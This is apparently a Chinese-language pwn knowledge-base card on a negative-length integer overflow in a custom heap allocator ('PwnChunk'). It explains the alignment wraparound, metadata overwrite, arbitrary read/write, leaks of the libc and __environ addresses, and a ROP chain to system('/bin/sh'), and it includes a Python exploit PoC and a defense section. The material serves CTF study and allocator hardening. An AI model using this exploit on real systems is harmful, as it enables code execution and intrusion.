---
id: binary-pwn-heap-custom-allocator-negative-size-alignment-overflow
title: 自定义堆管理器负数长度整数溢出：对齐后极小 chunk 被超长写入覆盖，构造任意读写
type: scenario
domain: binary
path: binary/pwn/heap
technique: custom-allocator-negative-size-alignment-integer-overflow
tags:
- pwn
- heap
- integer-overflow
- negative-size
- custom-allocator
- arbitrary-read-write
- ret2libc
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-166
  verified_at: '2026-11-06T10:12:37+08:00'
  notes: 已对照原文 PwnChunk 段核对：负 bio_len=-2 对齐回绕、16 arena 轮转、show/edit 任意读写、top+0x100790/0x871/libc 0x21ace0/__environ-0x120 ROP 均吻合；PoC 未执行
url: /docs/binary/pwn/heap/binary-pwn-heap-custom-allocator-negative-size-alignment-overflow/
draft: false
kb_aliases:
- 负数长度堆溢出
- 自定义堆管理器整数溢出
- MemoryPool 16 arena
- chunk header 对齐溢出
- PwnChunk
- 堆元数据覆盖任意读写
---

## 一句话结论

当自定义堆管理器的分配函数用 `aligned = (size + sizeof(header) + 0xF) & ~0xF` 计算块大小，而 `size` 来自用户可控的有符号长度时，传入负值会让无符号加法回绕、对齐后得到一个极小 chunk；随后按“用户声称的长度”写入数据，就会从这个小 chunk 开始无界覆盖相邻 chunk/区域元数据。配合 show/edit 读出并篡改链表指针，即可把堆溢出升级为任意地址读写，最终泄露 libc、改栈返回地址 ROP 提权。

## 原理

- **整数回绕**：`size` 若为负的 `int`，在与 `size_t` 类型的 `sizeof(header)`/掩码运算时先被转换为无符号，`size + header + 0xF` 在 64 位上回绕成一个小值（例如负值恰好抵消 header+0xF），`& ~0xF` 后得到 0x10/0x20 级别的 chunk。分配器认为只申请了极小空间，但业务层仍按原始长度（或后续编辑长度）拷贝数据。
- **元数据布局**：示例分配器的 chunk 头包含 `size`、`prevChunkAddr`（相对偏移，用于合并）、`prev/next` 双向链表指针；区域（MemRegion）还有 `regionSize/dataSize/dataStart/dataEnd` 与内嵌的第一个节点。极小 chunk 后的超长写会直接覆盖下一个 chunk 的 `size` 与 `prev/next`，从而控制后续 free/合并/遍历时的指针解引用。
- **多 arena 轮转**：主控制结构有 16 个活跃区域（类似 16 个 arena），按 `idx` 轮转分配。攻击者需要先用固定大小/顺序的分配把目标 chunk 落到已知 arena，并让溢出命中特定相邻 chunk；否则溢出只会破坏无关区域。
- **show/edit 放大**：溢出改写相邻 chunk 的 `size`/链表指针后，show 可以读出被改指针指向的内存（任意读），edit 可以向该地址写（任意写）。示例先泄露堆地址，再把 top chunk 的 size 改成 0x871 并申请大块，使 top chunk 覆盖到目标结构，从 top+0x10 泄露 libc；再用 `__environ` 泄露栈地址，把 ROP 链写到返回地址。
- **为什么是“无限”溢出**：分配出的 chunk 很小，但业务层允许指定 bio 长度并原样 `memcpy`，写入长度不受 chunk 大小约束；只要输入长度足够，就能连续覆盖多个 chunk 和区域结构。

## 触发条件

- 自定义分配器用有符号长度做 `size + header + align` 运算，且未检查负值/溢出；后续拷贝使用原始长度或未与分配大小比较。
- 用户能控制长度字段（如个人简介长度）并能提供超长内容；分配器元数据包含可被覆盖的 size/链表指针。
- 堆布局可被多 arena 轮转与固定顺序分配控制；程序提供 show/edit 等读写接口。
- 目标为 64 位 Linux、有 libc 可泄露；栈地址可通过 `__environ` 或类似符号获得。

## 利用步骤

1. **确认回绕值**：本地用相同类型/编译器验证负长度对应的 aligned_size，选择一个既能通过检查又能让后续写入覆盖目标 chunk 的负值（示例用 -2 配合已有 8 字节数据）。
2. **布置 arena**：先分配 16 个 0x9000 大块占满/轮转 16 个 arena，再用 0x100 的留言块建立稳定的 chunk 序列；删除/重建用户使目标 chunk 落在可控位置。
3. **制造极小 chunk 并溢出**：调用创建用户并传入负的 bio_len，随后写入精心构造的 bio（填充 + 伪 chunk size/prev/next + 标记），覆盖相邻 chunk 的元数据。
4. **泄露堆地址**：用 show 读取被改写的链表/数据区，识别标记字节，计算堆基址（示例 `leak - 0x20468`）。
5. **构造任意读写**：把某个 chunk 的 next 指针改成目标地址，show 读该地址；把另一个 chunk 的 next 改成目标地址，edit 写该地址（示例 `arb_read`/`arb_write`）。
6. **改 top chunk 取大块**：把 top chunk 的 size 改为 0x871，删除用户后重新创建 0xffa0 大小的 bio，使 top chunk 扩展覆盖 libc 相关结构；从 top+0x10 读出 libc 指针（示例偏移 0x21ace0）。
7. **泄露栈并写 ROP**：读 `__environ` 得栈地址，计算返回地址（示例 environ-0x120），用 arb_write 依次写 `pop rdi; ret`、`/bin/sh`、`ret`、`system`。
8. **触发返回**：退出程序/选择退出功能，触发被覆盖的返回地址，执行 `system("/bin/sh")`。

## PoC

```python
# 关键步骤（配合 add_user/send_message/show/edit 等封装）
add_user()
for i in range(16):                      # 占满 16 个 arena
    send_message(title_len=0x9000, content_len=0x9000)
for i in range(20):                      # 建立 0x100 chunk 序列
    send_message(title_len=0x100, content_len=0x100)
delete_user(); add_user(bio_len=0, bio=b'')
send_message(title_len=0x100, content_len=0x100)

# 负长度触发对齐回绕，bio 覆盖相邻 chunk 元数据
delete_user()
add_user(bio_len=-2,
         bio=b'A'*0xa8 + p32(0x50) + p32(0) + p64(0)*2 + b'N'*0x20 + b'\x68' + b'\n')

show_messages()
s.recvuntil(b'N'*0x20)
heap = u64(s.recv(6) + b'\x00\x00') - 0x20468

def arb_read(addr):
    edit_message(idx1, p64(addr)); show_messages()
    s.recvuntil(b'--- 留言 6 ---'); s.recvuntil(b'标题: ')
    return s.recvuntil(b'\n', drop=True)

def arb_write(addr, value):
    edit_message(idx1, p64(addr)); edit_message(idx2, p64(value))

topchunk = heap + 0x100790
arb_write(topchunk + 8, 0x871)           # 改 top size
delete_user(); add_user(bio_len=0xffa0, bio=b'A\n')
libc.address = u64(arb_read(topchunk + 0x10) + b'\x00\x00') - 0x21ace0
environ = u64(arb_read(libc.sym['__environ']) + b'\x00\x00')
ret = environ - 0x120
arb_write(ret, pop_rdi); arb_write(ret+8, binsh)
arb_write(ret+16, ret_gadget); arb_write(ret+24, libc.sym['system'])
exit_system()
```

具体负值、偏移、标记与 arena 数量依目标分配器实现而定；本卡不执行 PoC。

## 变体与关联

- **只影响分配大小检查**：若后续 `memcpy` 长度被截断/校验，回绕只造成小 chunk，不直接溢出；需要寻找“分配用对齐后大小、拷贝用原始长度”的不一致点。
- **不同对齐/头大小**：header 大小、对齐粒度、32/64 位会改变回绕结果；可用 `sizeof` 与编译器类型推算。
- **其它元数据攻击**：覆盖 size 触发合并（unlink）、覆盖 freelist 指针、覆盖 region 的 dataStart/dataEnd 都可转为任意读写；不限于示例的 top chunk 路线。
- **关联**：[[binary-pwn-heap-abs-intmin-length-bypass-bss-fake-chunk-tcache-got]]（另一类负数长度绕过）、[[binary-pwn-heap-negative-size-malloc-failure-stale-pointer-house-of-cat]]（负数 size 导致悬垂指针）、[[binary-pwn-stack-abs-intmin-negative-remainder-stack-overflow]]（负数取模栈溢出）。
- **边界**：需要有符号/无符号转换点且未被 `-ftrapv`/UBSan 捕获；现代分配器 hardened 元数据可能检测到 size 异常；本卡依赖自定义分配器，不适用于 glibc malloc。

## 检测与防御

- **输入校验**：长度字段先检查 `size >= 0` 且 `size <= MAX`，再做无符号运算；分配大小与拷贝长度使用同一变量，避免“分配小、拷贝大”。
- **编译器加固**：开启 UBSan/`-ftrapv`、`FORTIFY_SOURCE`、ASAN；对自定义分配器加 canary/redzone 与 size 一致性检查。
- **分配器设计**：元数据与用户数据分离（带外 header）、freelist 指针编码/校验、分配前检查 size 与对齐溢出。
- **检测**：堆 chunk size 异常（0x10 小 chunk 后出现超长写）、相邻元数据被覆盖、进程崩溃在 free/合并路径；审计代码中 `(size + header + align) & ~align` 模式。
- **响应**：修复分配器后，检查是否已有利用痕迹（异常大块、top chunk 被改、`__environ` 附近被写）。
